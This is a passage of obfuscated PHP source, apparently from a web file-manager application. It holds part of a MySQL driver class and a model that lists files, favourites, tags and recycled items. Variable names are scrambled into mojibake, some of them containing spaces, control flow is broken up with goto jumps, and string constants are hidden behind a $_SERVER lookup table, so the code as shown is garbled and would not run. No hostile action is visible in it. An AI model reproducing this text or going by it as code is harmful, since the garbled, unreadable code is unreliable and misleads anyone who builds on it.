$Cüœüú⁄ù¶[$d…™»“≥∂»[35]], $d…™»“≥∂»[36] => strtolower($Cüœüú⁄ù¶[$d…™»“≥∂»[37]]) == $d…™»“≥∂»[38], $d…™»“≥∂»[39] => strtolower($Cüœüú⁄ù¶[$d…™»“≥∂»[40]]) == $d…™»“≥∂»[41]); } } return $E≈áâºàíŸ; } public function getTables($Aºíá∑ä◊û = '') { $d±∞≠£©Ôà =& $_SERVER[¯èãÄπµ]; if (!empty($Aºíá∑ä◊û)) { $FÏÃÖπé÷Â = $d±∞≠£©Ôà[816] . $Aºíá∑ä◊û; } else { $FÏÃÖπé÷Â = $d±∞≠£©Ôà[817]; } $dç’úıÙ¬è = $this->query($FÏÃÖπé÷Â); $Fâ±ª Êïπ = array(); foreach ($dç’úıÙ¬è as $AŒË‹èœ»Ø => $C¿öûäÖﬁã) { $Fâ±ª Êïπ[$AŒË‹èœ»Ø] = current($C¿öûäÖﬁã); } return $Fâ±ª Êïπ; } public function replace($A¯ˆ“áåßÈ, $d‘ëõÊ‘ûõ = array()) { $CÀı◊“ò◊¡ =& $_SERVER[¯èãÄπµ]; foreach ($A¯ˆ“áåßÈ as $aú∞ÙêüÕ‚ => $EÈ«È±®‹û) { $dÑ≤∞ÂÛã÷ = $this->parseValue($EÈ«È±®‹û); if (is_scalar($dÑ≤∞ÂÛã÷)) { $C˜ÿìÜΩÿÛ[] = $dÑ≤∞ÂÛã÷; $d’◊ë“˘≈ª[] = $this->parseKey($aú∞ÙêüÕ‚); } } $E≈‘òä’à’ = $CÀı◊“ò◊¡[818] . $this->parseTable($d‘ëõÊ‘ûõ[$CÀı◊“ò◊¡[263]]) . $CÀı◊“ò◊¡[819] . implode($CÀı◊“ò◊¡[47], $d’◊ë“˘≈ª) . $CÀı◊“ò◊¡[820] . implode($CÀı◊“ò◊¡[47], $C˜ÿìÜΩÿÛ) . $CÀı◊“ò◊¡[821]; return $this->execute($E≈‘òä’à’); } public function insertAll($bãÃõ©ıô©, $FË‹ı‰°çÇ = array(), $Fª¯ùÏôßâ = false) { goto bºÖ∑©‘àÑ; bºÖ∑©‘àÑ: $AØ†à¥àıÉ =& $_SERVER[¯èãÄπµ]; if (!is_array($bãÃõ©ıô©[0])) { return !1; } $b–’•¶âù· = array_keys($bãÃõ©ıô©[0]); goto cÂŸ∏ÉëÛÿ; dœÑû≈Íåë: $Eí÷ì√Ã¢— = ($Fª¯ùÏôßâ ? $AØ†à¥àıÉ[823] : $AØ†à¥àıÉ[824]) . $AØ†à¥àıÉ[825] . $this->parseTable($FË‹ı‰°çÇ[$AØ†à¥àıÉ[263]]) . $AØ†à¥àıÉ[819] . implode($AØ†à¥àıÉ[47], $b–’•¶âù·) . $AØ†à¥àıÉ[826] . implode($AØ†à¥àıÉ[47], $A«≤∆¿È‘ƒ); return $this->execute($Eí÷ì√Ã¢—); goto c¡ÿ©≤…ôÌ; cÂŸ∏ÉëÛÿ: $A«≤∆¿È‘ƒ = array(); foreach ($bãÃõ©ıô© as $Fó´À”ñ“≤) { $b√àÑΩœ„∂ = array(); foreach ($Fó´À”ñ“≤ as $FÔÉŒ„§„Ø => $Båã§ê˜ﬂè) { $Båã§ê˜ﬂè = $this->parseValue($Båã§ê˜ﬂè); if (is_scalar($Båã§ê˜ﬂè)) { $b√àÑΩœ„∂[] = $Båã§ê˜ﬂè; } } $A«≤∆¿È‘ƒ[] = $AØ†à¥àıÉ[244] . implode($AØ†à¥àıÉ[47], $b√àÑΩœ„∂) . $AØ†à¥àıÉ[821]; } array_walk($b–’•¶âù·, array($this, $AØ†à¥àıÉ[822])); goto dœÑû≈Íåë; c¡ÿ©≤…ôÌ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eáÎ’ŸÊÀí =& $_SERVER[¯èãÄπµ]; $this->error = mysql_errno() . $eáÎ’ŸÊÀí[4] . mysql_error($this->_linkID); if ($eáÎ’ŸÊÀí[33] != $this->queryStr) { $this->error .= LNG($eáÎ’ŸÊÀí[45]) . $this->queryStr; } think_trace($this->error, $eáÎ’ŸÊÀí[33], $eáÎ’ŸÊÀí[46]); return $this->error; } public function escapeString($f’ûï·ç®ú) { if ($this->_linkID) { return mysql_real_escape_string($f’ûï·ç®ú, $this->_linkID); } else { return mysql_escape_string($f’ûï·ç®ú); } } public function parseKey(&$aãŒçß√„, $dƒàÚ‘ïêŸ = true) { $F„ÎàÆçè´ =& $_SERVER[¯èãÄπµ]; if ($dƒàÚ‘ïêŸ) { $aãŒçß√„ = $this->parseKeyCheck($aãŒçß√„); } if ($aãŒçß√„ != $F„ÎàÆçè´[172] && !preg_match($F„ÎàÆçè´[827], $aãŒçß√„)) { $aãŒçß√„ = $F„ÎàÆçè´[828] . trim($aãŒçß√„, $F„ÎàÆçè´[828]) . $F„ÎàÆçè´[828]; } return $aãŒçß√„; } } goto Aó∑≈¨úµæ; eÆ‡åÖ≠Ñ‘: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\x65" => "\151\157\x5f\x73\157\165\162\x63\x65\x5f\155\x65\x74\x61", "\x6d\x65\x74\141\106\x69\145\154\144" => "\163\x6f\x75\162\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\151\x6d\x65", "\164\151\155\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\x63\x72\145\141\x74\x65\124\151\155\x65", "\x74\151\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\x76\151\145\167\x54\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\164", "\146\165\x6e\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($cÊò»ºŸ§à) { return $this->listSource(array($_SERVER[¯èãÄπµ][364] => $cÊò»ºŸ§à)); } public function typeName($C£Ëé˘ªá⁄) { static $cÙêÂÛ™Ùÿ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $cÙêÂÛ™Ùÿ[$C£Ëé˘ªá⁄ . $_SERVER[¯èãÄπµ][33]]; } public function sourceListInfo($CÁ∑–ïë≠º, $aË¯Éá†Ç∆ = false) { goto E∏êÌŸõÛá; c∞÷±‚≠û»: return array_to_keyvalue($bËÒø⁄ƒ∞◊, $AÌù‘ÍÉóÌ[365]); goto CêÿîﬁΩó¨; E∏êÌŸõÛá: $AÌù‘ÍÉóÌ =& $_SERVER[¯èãÄπµ]; $CÁ∑–ïë≠º = $CÁ∑–ïë≠º ? $CÁ∑–ïë≠º : array(); $CÁ∑–ïë≠º = array_filter(array_unique($CÁ∑–ïë≠º)); goto aÏ°∆Õ≤Éô; aÏ°∆Õ≤Éô: if (!$CÁ∑–ïë≠º) { return array(); } $bËÒø⁄ƒ∞◊ = $this->where(array($AÌù‘ÍÉóÌ[365] => array($AÌù‘ÍÉóÌ[7], $CÁ∑–ïë≠º)))->select(); $this->_listDataApply($bËÒø⁄ƒ∞◊, $aË¯Éá†Ç∆); goto c∞÷±‚≠û»; CêÿîﬁΩó¨: } public function pathInfoFilter($aûÎÎ‘¿ßø) { goto E¿√âÉßäÆ; A»üìì‘å≠: if (isset($aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[372]]) && $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[372]][$a≈‚∞Ùã÷[373]] == -1) { $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[183]); $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[106]); $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[374]); $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[375]); $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[77]); $C«‡ª◊Ö◊´ = array_remove_value($C«‡ª◊Ö◊´, $a≈‚∞Ùã÷[376]); } $aûÎÎ‘¿ßø = array_field_key($aûÎÎ‘¿ßø, $C«‡ª◊Ö◊´); return $aûÎÎ‘¿ßø; goto dΩ†¥‹ÍÔı; E’±¿ÙÖ·ø: $eåûçæ»øœ .= $a≈‚∞Ùã÷[370]; $eåûçæ»øœ .= $a≈‚∞Ùã÷[371]; $C«‡ª◊Ö◊´ = explode($a≈‚∞Ùã÷[47], $eåûçæ»øœ); goto A»üìì‘å≠; Bà©∫ñìáÃ: $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[367]] = $this->typeName($aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[367]]); if ($aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[366]] != 1) { $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[156]] = $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[368]]; unset($aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[368]]); } $eåûçæ»øœ = $a≈‚∞Ùã÷[369]; goto E’±¿ÙÖ·ø; E¿√âÉßäÆ: $a≈‚∞Ùã÷ =& $_SERVER[¯èãÄπµ]; $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[75]] = KodIO::make($aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[365]]); $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[29]] = $aûÎÎ‘¿ßø[$a≈‚∞Ùã÷[366]] == 1 ? $a≈‚∞Ùã÷[76] : $a≈‚∞Ùã÷[163]; goto Bà©∫ñìáÃ; dΩ†¥‹ÍÔı: } public function listUserFav() { goto b√Óˆ®∫ñ; b∫ëâùå‘£: $C‡ÕÎÎ¢Ú– = array_to_keyvalue($C‡ÕÎÎ¢Ú–, $dÆ„—∞•πï[33], $dÆ„—∞•πï[75]); if ($C‡ÕÎÎ¢Ú–) { $b©˜å¯µ√™ = $this->listSource(array($dÆ„—∞•πï[379] => array($dÆ„—∞•πï[380], $C‡ÕÎÎ¢Ú–))); } $b©˜å¯µ√™ = array_to_keyvalue($b©˜å¯µ√™[$dÆ„—∞•πï[350]], $dÆ„—∞•πï[365]); goto D§øò†√¥—; b√Óˆ®∫ñ: $dÆ„—∞•πï =& $_SERVER[¯èãÄπµ]; $E…«Í¶ü›≈ = Model($dÆ„—∞•πï[377])->listData(); $C‡ÕÎÎ¢Ú– = array_filter_by_field($E…«Í¶ü›≈, $dÆ„—∞•πï[29], $dÆ„—∞•πï[378]); goto b∫ëâùå‘£; D§øò†√¥—: foreach ($E…«Í¶ü›≈ as &$c„⁄…√Æ¥Â) { $c„⁄…√Æ¥Â = array($dÆ„—∞•πï[381] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[363]], $dÆ„—∞•πï[382] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[28]], $dÆ„—∞•πï[383] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[75]], $dÆ„—∞•πï[384] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[29]], $dÆ„—∞•πï[385] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[183]], $dÆ„—∞•πï[386] => $c„⁄…√Æ¥Â[$dÆ„—∞•πï[106]]); if ($c„⁄…√Æ¥Â[$dÆ„—∞•πï[29]] == $dÆ„—∞•πï[378] && $b©˜å¯µ√™[$c„⁄…√Æ¥Â[$dÆ„—∞•πï[75]]]) { $c„⁄…√Æ¥Â[$dÆ„—∞•πï[387]] = $b©˜å¯µ√™[$c„⁄…√Æ¥Â[$dÆ„—∞•πï[75]]]; } } return $E…«Í¶ü›≈; goto DªíËÓóƒ≥; DªíËÓóƒ≥: } public function listUserTag($c´µúñ®Ù√) { goto c√ãØﬂî™£; aª∂åö∞∫’: $cº˘üﬂ•∆û = array_to_keyvalue($cº˘üﬂ•∆û, $cëÔÎÈÊê⁄[33], $cëÔÎÈÊê⁄[75]); $BØ§ëÖ≥¬— = array(); if ($cº˘üﬂ•∆û) { $eéÓÍıçﬁ¥ = array($cëÔÎÈÊê⁄[379] => array($cëÔÎÈÊê⁄[380], $cº˘üﬂ•∆û)); $BØ§ëÖ≥¬— = $this->listSource($eéÓÍıçﬁ¥); } goto A«àçˆ€‹∆; A«àçˆ€‹∆: $this->listUserTagClear($cº˘üﬂ•∆û, $BØ§ëÖ≥¬—, $c´µúñ®Ù√); return $BØ§ëÖ≥¬—; goto Eƒ”©©÷—Ü; c√ãØﬂî™£: $cëÔÎÈÊê⁄ =& $_SERVER[¯èãÄπµ]; $dÜ…ù√ü»∑ = Model($cëÔÎÈÊê⁄[388])->listData(); $cº˘üﬂ•∆û = array_filter_by_field($dÜ…ù√ü»∑, $cëÔÎÈÊê⁄[389], $c´µúñ®Ù√); goto aª∂åö∞∫’; Eƒ”©©÷—Ü: } private function listUserTagClear($aù◊Æ–∑â‘, $B’´ÃÏ‰¡≠, $cøº¡‡–ﬂ·) { goto e€¯œä›‡Ò; Dëó√ªı“∆: Model($f»≈Ù’Ÿ≤ô[390])->removeFromTag($A™·‡Ë˘æ, $cøº¡‡–ﬂ·); goto A§‚ªâŸ Ÿ; e€¯œä›‡Ò: $f»≈Ù’Ÿ≤ô =& $_SERVER[¯èãÄπµ]; if (!$aù◊Æ–∑â‘) { return; } if ($B’´ÃÏ‰¡≠ && count($aù◊Æ–∑â‘) == $B’´ÃÏ‰¡≠[$f»≈Ù’Ÿ≤ô[347]][$f»≈Ù’Ÿ≤ô[348]]) { return; } goto cÛÁæÀû£◊; cÛÁæÀû£◊: $A™·‡Ë˘æ = array(); $Cë≠¢¿Ü‚Î = array_to_keyvalue($B’´ÃÏ‰¡≠[$f»≈Ù’Ÿ≤ô[74]], $f»≈Ù’Ÿ≤ô[33], $f»≈Ù’Ÿ≤ô[365]); $Fµ´‡¥›ŒÔ = array_to_keyvalue($B’´ÃÏ‰¡≠[$f»≈Ù’Ÿ≤ô[73]], $f»≈Ù’Ÿ≤ô[33], $f»≈Ù’Ÿ≤ô[365]); goto a¢õ∞å≠ë¶; a¢õ∞å≠ë¶: $BÇ˜é™ëà≤ = array_merge($Fµ´‡¥›ŒÔ, $Cë≠¢¿Ü‚Î); foreach ($aù◊Æ–∑â‘ as $f√æ“‚–Öª) { if (!in_array($f√æ“‚–Öª, $BÇ˜é™ëà≤)) { $A™·‡Ë˘æ[] = $f√æ“‚–Öª; } } if (!$A™·‡Ë˘æ) { return; } goto Dëó√ªı“∆; A§‚ªâŸ Ÿ: } public function listUserRecycle() { $b±Ì¯ÓÎ´Á =& $_SERVER[¯èãÄπµ]; $cÈêÊ›ÂßÆ = Model($b±Ì¯ÓÎ´Á[391])->listData(); if (!$cÈêÊ›ÂßÆ) { return array(); } $A›ÒÖæçÌª = array($b±Ì¯ÓÎ´Á[379] => array($b±Ì¯ÓÎ´Á[380], $cÈêÊ›ÂßÆ), $b±Ì¯ÓÎ´Á[392] => 1); return $this->listSource($A›ÒÖæçÌª); } public function listSource($fóâü÷Ñ„∆, $AÎîÉ—±ﬁÔ = 3000) { goto EµÊ¥éÓ√±; D°≥ƒô¨ÉÕ: return $CëËÔõŸ»ü; goto däêÛ∆öÜ¿; EµÊ¥éÓ√±: $B¶®âÖ‹Ãô =& $_SERVER[¯èãÄπµ]; if (!isset($fóâü÷Ñ„∆[$B¶®âÖ‹Ãô[393]])) { $fóâü÷Ñ„∆[$B¶®âÖ‹Ãô[393]] = 0; } $eªŸÕ£êâ– = $B¶®âÖ‹Ãô[394]; goto F»¶¬™∏†∫; F»¶¬™∏†∫: $CëËÔõŸ»ü = $this->field($eªŸÕ£êâ–)->_makeOrder()->where($fóâü÷Ñ„∆)->selectPage($AÎîÉ—±ﬁÔ); $this->_listDataApply($CëËÔõŸ»ü[$B¶®âÖ‹Ãô[350]]); $this->_listMake($CëËÔõŸ»ü); goto D°≥ƒô¨ÉÕ; däêÛ∆öÜ¿: } protected function _makeOrder() { goto f≥âÁØ§Ã›; f≥âÁØ§Ã›: $A˜µÎû±Øì =& $_SERVER[¯èãÄπµ]; $A§©±òã¯≈ = Model($A˜µÎû±Øì[395])->get($A˜µÎû±Øì[396]); $Fú√”∑›¨— = Model($A˜µÎû±Øì[395])->get($A˜µÎû±Øì[397]); goto fí üÿåúŸ; DôÕ⁄∆îìö: if ($e¥´áªÎØÎ == $A˜µÎû±Øì[28]) { } $BƒàÜ ·„€ = $A˜µÎû±Øì[405] . $AÇÉ≥∂ûîÍ[$e¥´áªÎØÎ] . $A˜µÎû±Øì[50] . $AàîÕŸ°ØÇ[$B≈§‚”›äê]; return $this->order(rtrim(trim($BƒàÜ ·„€), $A˜µÎû±Øì[47])); goto aï†‘Ü◊´®; fí üÿåúŸ: $AàîÕŸ°ØÇ = array($A˜µÎû±Øì[398] => $A˜µÎû±Øì[399], $A˜µÎû±Øì[400] => $A˜µÎû±Øì[401]); $AÇÉ≥∂ûîÍ = array($A˜µÎû±Øì[28] => $A˜µÎû±Øì[28], $A˜µÎû±Øì[77] => $A˜µÎû±Øì[77], $A˜µÎû±Øì[156] => $A˜µÎû±Øì[368], $A˜µÎû±Øì[374] => $A˜µÎû±Øì[374], $A˜µÎû±Øì[402] => $A˜µÎû±Øì[375], $A˜µÎû±Øì[183] => $A˜µÎû±Øì[183], $A˜µÎû±Øì[106] => $A˜µÎû±Øì[106]); $e¥´áªÎØÎ = Input::get($A˜µÎû±Øì[403], $A˜µÎû±Øì[7], $A§©±òã¯≈, array_keys($AÇÉ≥∂ûîÍ)); goto BÍì∏∏Û‚å; BÍì∏∏Û‚å: $B≈§‚”›äê = Input::get($A˜µÎû±Øì[404], $A˜µÎû±Øì[7], $Fú√”∑›¨—, array_keys($AàîÕŸ°ØÇ)); if (!in_array($e¥´áªÎØÎ, array_keys($AÇÉ≥∂ûîÍ))) { $e¥´áªÎØÎ = $A˜µÎû±Øì[28]; } if (!in_array($B≈§‚”›äê, array_keys($AàîÕŸ°ØÇ))) { $e¥´áªÎØÎ = $A˜µÎû±Øì[398]; } goto DôÕ⁄∆îìö; aï†‘Ü◊´®: } protected function _listDataApplyItem($D≥Ö¯Â˘Ôô, $AÆÖÚüî·« = false) { $f£ﬁÈ‡¥∑‰ = array($D≥Ö¯Â˘Ôô); $this->_listDataApply($f£ﬁÈ‡¥∑‰, $AÆÖÚüî·«); return $f£ﬁÈ‡¥∑‰[0]; } protected function _listDataApply(&$a–êóÇŸÁ‚, $E•ÿéèàµª = false) { goto aì≥‰ºµ’·; c£Ÿ¿Êã€ü: $Aà—Éó¢ãú = array_unique($Aà—Éó¢ãú); $this->_listSourceCache($a–êóÇŸÁ‚); if (!$E•ÿéèàµª) { $this->_listAppendMeta($a–êóÇŸÁ‚, $Aà—Éó¢ãú); $this->_listAppendFileMeta($a–êóÇŸÁ‚, $Aà—Éó¢ãú); $this->_listAppendChildren($a–êóÇŸÁ‚, $Aà—Éó¢ãú); } goto fÃãí”ìû„; fÃãí”ìû„: $this->_listAppendPath($a–êóÇŸÁ‚); $this->_listAppendAuth($a–êóÇŸÁ‚); $this->_listAppendSourceInfo($a–êóÇŸÁ‚, $Aà—Éó¢ãú); goto D’…¬ã∑≠¡; aì≥‰ºµ’·: $eìÁ©Çû»ñ =& $_SERVER[¯èãÄπµ]; if (!$a–êóÇŸÁ‚) { $a–êóÇŸÁ‚ = array(); return; } $Aà—Éó¢ãú = array_to_keyvalue($a–êóÇŸÁ‚, $eìÁ©Çû»ñ[33], $eìÁ©Çû»ñ[365]); goto c£Ÿ¿Êã€ü; D’…¬ã∑≠¡: $this->_listAppendUser($a–êóÇŸÁ‚); $this->_listFilterInfo($a–êóÇŸÁ‚, $E•ÿéèàµª); goto fÍöØê∫¶ﬁ; fÍöØê∫¶ﬁ: } protected function _listSourceCache($E†ƒÛ÷§Ú) { $Cß¢‰èÎîÏ =& $_SERVER[¯èãÄπµ]; foreach ($E†ƒÛ÷§Ú as $CöÁ…é ˆ∆) { self::$cacheSourceInfo[$Cß¢‰èÎîÏ[406] . $CöÁ…é ˆ∆[$Cß¢‰èÎîÏ[365]]] = $CöÁ…é ˆ∆; } } protected function _listFilterInfo(&$b»‰ö˘„ëá, $eÜÇ≠·‹…Ì = false) { $d¨Ò€Èø¢å =& $_SERVER[¯èãÄπµ]; foreach ($b»‰ö˘„ëá as &$CÖ⁄º∆√‘’) { $CÖ⁄º∆√‘’ = $this->pathInfoFilter($CÖ⁄º∆√‘’); self::$cachePathInfo[$d¨Ò€Èø¢å[407] . intval($eÜÇ≠·‹…Ì) . $d¨Ò€Èø¢å[408] . $CÖ⁄º∆√‘’[$d¨Ò€Èø¢å[365]]] = $CÖ⁄º∆√‘’; } } protected function _listMake(&$fô¥”È·«Ö) { $eÏÖîÂïü¬ =& $_SERVER[¯èãÄπµ]; $fô¥”È·«Ö[$eÏÖîÂïü¬[74]] = array(); $fô¥”È·«Ö[$eÏÖîÂïü¬[73]] = array(); foreach ($fô¥”È·«Ö[$eÏÖîÂïü¬[350]] as $Aÿâ›Üâ∞¡) { $C∏áëµúœà = $Aÿâ›Üâ∞¡[$eÏÖîÂïü¬[366]] == 1 ? $eÏÖîÂïü¬[74] : $eÏÖîÂïü¬[73]; $fô¥”È·«Ö[$C∏áëµúœà][] = $Aÿâ›Üâ∞¡; } unset($fô¥”È·«Ö[$eÏÖîÂïü¬[350]]); } protected function _listAppendMeta(&$a‡∂¡Ù∫›‰, $e∞à‘ÆÛ≠∏) { goto aÚÂºâ¡ı´; aÚÂºâ¡ı´: $A‹≈Ù»’ÆÇ =& $_SERVER[¯èãÄπµ]; $Aï”€íÀ≤Ù = array($A‹≈Ù»’ÆÇ[379] => array($A‹≈Ù»’ÆÇ[380], $e∞à‘ÆÛ≠∏)); $d∆˜èÈÁ Í = Model($A‹≈Ù»’ÆÇ[409])->field($A‹≈Ù»’ÆÇ[410])->where($Aï”€íÀ≤Ù)->select(); goto dıÓ‹´≤∆Ó; dıÓ‹´≤∆Ó: if (!$d∆˜èÈÁ Í) { return; } $eÚªìÜ∏å” = array($A‹≈Ù»’ÆÇ[411], $A‹≈Ù»’ÆÇ[412]); $E‚øß‰ºÒÛ = array(); goto e‡≈ñ•´äé; e‡≈ñ•´äé: foreach ($d∆˜èÈÁ Í as $Dâæ≈…¬èÇ) { if (!isset($E‚øß‰ºÒÛ[$Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[365]]])) { $E‚øß‰ºÒÛ[$Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[365]]] = array(); } if (in_array($Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[89]], $eÚªìÜ∏å”)) { continue; } $E‚øß‰ºÒÛ[$Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[365]]][$Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[89]]] = $Dâæ≈…¬èÇ[$A‹≈Ù»’ÆÇ[355]]; } foreach ($a‡∂¡Ù∫›‰ as &$C€ŒÁ«¬∞ı) { $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[413]] = !1; if (isset($E‚øß‰ºÒÛ[$C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[365]]])) { $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[413]] = $E‚øß‰ºÒÛ[$C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[365]]]; } if ($this->fileIsLock($C€ŒÁ«¬∞ı) && $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[372]]) { $FÎÏ◊áÂé∑ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[372]][$A‹≈Ù»’ÆÇ[373]] = AuthModel::authDisable($C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[372]][$A‹≈Ù»’ÆÇ[373]], $FÎÏ◊áÂé∑); $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[372]][$A‹≈Ù»’ÆÇ[414]][$A‹≈Ù»’ÆÇ[372]] = $C€ŒÁ«¬∞ı[$A‹≈Ù»’ÆÇ[372]][$A‹≈Ù»’ÆÇ[373]]; } } goto aŸÑÏû¨êË; aŸÑÏû¨êË: } protected function _listAppendFileMeta(&$E‹Ë»ÂÛàò, $AÒæ◊Ì§“©) { goto fàµ·⁄Õ≠Ó; EÍá¶Ô˜„ù: $b€Æﬂ©Ú£≥ = Model($FïÒ¯Ùò∞ê[418])->field($cÆ∑íËç∆À)->where($fËÀµóá›±)->select(); $b€Æﬂ©Ú£≥ = array_to_keyvalue($b€Æﬂ©Ú£≥, $FïÒ¯Ùò∞ê[415]); $Aµµ–ëﬂ„ˆ = Model($FïÒ¯Ùò∞ê[419])->field($FïÒ¯Ùò∞ê[420])->where($fËÀµóá›±)->select(); goto aÖª±ƒº∂À; fàµ·⁄Õ≠Ó: $FïÒ¯Ùò∞ê =& $_SERVER[¯èãÄπµ]; $dÆﬁ∑Õ≥≥Ö = array_to_keyvalue($E‹Ë»ÂÛàò, $FïÒ¯Ùò∞ê[33], $FïÒ¯Ùò∞ê[415]); $dÆﬁ∑Õ≥≥Ö = array_filter(array_unique($dÆﬁ∑Õ≥≥Ö)); goto f√ﬁË◊ØÇ©; aÖª±ƒº∂À: $Aµµ–ëﬂ„ˆ = $Aµµ–ëﬂ„ˆ ? $Aµµ–ëﬂ„ˆ : array(); $dÆ⁄¿âŸﬁÓ = array(); foreach ($Aµµ–ëﬂ„ˆ as $BÀÆßúäªö) { if (!isset($dÆ⁄¿âŸﬁÓ[$BÀÆßúäªö[$FïÒ¯Ùò∞ê[415]]])) { $dÆ⁄¿âŸﬁÓ[$BÀÆßúäªö[$FïÒ¯Ùò∞ê[415]]] = array(); } $dÆ⁄¿âŸﬁÓ[$BÀÆßúäªö[$FïÒ¯Ùò∞ê[415]]][$BÀÆßúäªö[$FïÒ¯Ùò∞ê[89]]] = $BÀÆßúäªö[$FïÒ¯Ùò∞ê[355]]; } goto DãŸ†Îô•“; f√ﬁË◊ØÇ©: if (!$dÆﬁ∑Õ≥≥Ö) { return; } $fËÀµóá›± = array($FïÒ¯Ùò∞ê[416] => array($FïÒ¯Ùò∞ê[380], $dÆﬁ∑Õ≥≥Ö)); $cÆ∑íËç∆À = $FïÒ¯Ùò∞ê[417]; goto EÍá¶Ô˜„ù; DãŸ†Îô•“: foreach ($E‹Ë»ÂÛàò as &$B»éú—Û—) { goto e·õÊçÑﬁ¡; b≠§ó»„âÎ: $EúíèôöÌ≤[$FïÒ¯Ùò∞ê[77]] = $B»éú—Û—[$FïÒ¯Ùò∞ê[77]]; $EúíèôöÌ≤[$FïÒ¯Ùò∞ê[28]] = $B»éú—Û—[$FïÒ¯Ùò∞ê[28]]; self::$cacheFileInfo[$FïÒ¯Ùò∞ê[421] . $DêáË¡√Í≥] = $EúíèôöÌ≤; goto e√–ÔÖÏ˘•; e√–ÔÖÏ˘•: unset($b€Æﬂ©Ú£≥[$DêáË¡√Í≥][$FïÒ¯Ùò∞ê[75]]); $FüéıÀã¯í = is_array($dÆ⁄¿âŸﬁÓ[$DêáË¡√Í≥]) ? $dÆ⁄¿âŸﬁÓ[$DêáË¡√Í≥] : array(); $B»éú—Û—[$FïÒ¯Ùò∞ê[158]] = array_merge($FüéıÀã¯í, $b€Æﬂ©Ú£≥[$DêáË¡√Í≥]); goto a∆âÇûÒÿå; a∆âÇûÒÿå: if (isset($B»éú—Û—[$FïÒ¯Ùò∞ê[158]][$FïÒ¯Ùò∞ê[422]])) { $B»éú—Û—[$FïÒ¯Ùò∞ê[422]] = json_decode($B»éú—Û—[$FïÒ¯Ùò∞ê[158]][$FïÒ¯Ùò∞ê[422]], !0); unset($B»éú—Û—[$FïÒ¯Ùò∞ê[158]][$FïÒ¯Ùò∞ê[422]]); } goto AÀÏÆ≈Òø¡; e·õÊçÑﬁ¡: $DêáË¡√Í≥ = $B»éú—Û—[$FïÒ¯Ùò∞ê[415]]; if (!$DêáË¡√Í≥ || !isset($b€Æﬂ©Ú£≥[$DêáË¡√Í≥])) { continue; } $EúíèôöÌ≤ = $b€Æﬂ©Ú£≥[$DêáË¡√Í≥]; goto b≠§ó»„âÎ; AÀÏÆ≈Òø¡: } goto eôƒÌË€‚—; eôƒÌË€‚—: } protected function _listAppendSourceInfo(&$Dë∂«Ü∂ÌÚ, $bŸ¢¶»Œﬂå) { goto c∞À“˘ã¢Ø; Eÿòºó˘ü£: $f¨¢—Á™å‰ = Model($FÇ÷ˆºà¬¨[388])->listData(); $aÜ⁄ÒÌ¡–≠ = Model($FÇ÷ˆºà¬¨[377])->listData(); $DÙ›†‹øÑÑ = Model($FÇ÷ˆºà¬¨[425])->listSimple(); goto EÏ¡◊ïº÷∂; EÏ¡◊ïº÷∂: $f¡õ´’ÆÒù = array_to_keyvalue($Cª¥ìÊé–å, $FÇ÷ˆºà¬¨[363]); $e˜ö≥À¶’ä = array_to_keyvalue_group($f¨¢—Á™å‰, $FÇ÷ˆºà¬¨[75], $FÇ÷ˆºà¬¨[389]); $e›óùâ«·¨ = array_to_keyvalue($aÜ⁄ÒÌ¡–≠, $FÇ÷ˆºà¬¨[75]); goto e›ªÖæ√∏Ñ; c∞À“˘ã¢Ø: $FÇ÷ˆºà¬¨ =& $_SERVER[¯èãÄπµ]; if 